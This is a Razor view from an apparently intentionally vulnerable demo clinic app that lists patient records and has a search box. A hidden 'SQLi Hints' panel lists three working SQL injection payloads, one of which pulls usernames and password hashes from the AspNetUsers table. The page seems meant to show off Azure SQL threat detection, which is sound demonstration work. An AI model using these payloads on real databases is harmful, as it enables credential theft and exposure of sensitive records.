@model IEnumerable<ContosoClinic.Models.Patient>

@{
    ViewBag.Title = "Index";
}

<h2>Patients</h2>
<p>
    @using (Html.BeginForm("Index", "Patients", null, FormMethod.Post, new { @class = "form-horizontal", role = "form" }))
    {
        <div style="float: left; width:80%;">
            <div style="float: left; width: 60%;">
                @Html.TextBox("search", "", new { @class = "form-control", style = "width: 100%;max-width:100%" })
            </div>
            <div style="float: left; margin-left:10px; width: 20%;">
                <input type="submit" value="Search" class="btn btn-default" />
                <a id="tips_toggle">SQLi Hints</a>
            </div>
        </div>
    }
</p>

<p>
    @Html.ActionLink("Create New", "Create")
</p>
<div id="tips" class="hide">
    <br/>
    Pre-req: Enable Auditing and Threat Detection from the <a target="_blank" href="https://portal.azure.com">Azure portal</a>
    <br />
    To create SQL injection, you can try the following texts:
    <ul>
        <li>' OR CAST(@@@@version as int) = 1 --</li>
        <li>' UNION SELECT CAST(CAST('[id]='+CAST([id] as nvarchar)+'|[UserName]='+[UserName]+'|[PasswordHash]='+[PasswordHash] as int)as nvarchar), NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM [AspNetUsers] --</li>
        <li>' UNION SELECT '0', '1', '2', STUFF((select name from sys.tables FOR XML PATH('')),1,1,''), '4', '5', '6', '7', '8', '2010-10-10' --</li>
    </ul>
</div>
<table class="table">
    <tr>
        <th>
            @Html.DisplayNameFor(model => model.SSN)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.FirstName)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.LastName)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.MiddleName)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.StreetAddress)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.City)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.ZipCode)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.State)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.BirthDate)
        </th>
        <th></th>
    </tr>

@foreach (var item in Model) {
    <tr>
        <td style="white-space:nowrap">
            @Html.DisplayFor(modelItem => item.SSN)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.FirstName)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.LastName)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.MiddleName)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.StreetAddress)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.City)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.ZipCode)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.State)
        </td>
        <td style="white-space:nowrap">
            @Html.DisplayFor(modelItem => item.BirthDate)
        </td>
        <td>
            @Html.ActionLink("Edit", "Edit", new { id=item.PatientID }) |
            @Html.ActionLink("Details", "Details", new { id=item.PatientID }) |
            @Html.ActionLink("Delete", "Delete", new { id=item.PatientID })
        </td>
    </tr>
}

</table>
<script type="text/javascript">
    $(document).ready(function () {
        $('#tips_toggle').click(function () {
            var $elem = $('#tips');

            if ($elem.hasClass("hide")) {
                $elem.removeClass("hide").addClass("show");

            } else {
                $elem.removeClass("show").addClass("hide");
            }
        });

    });
</script>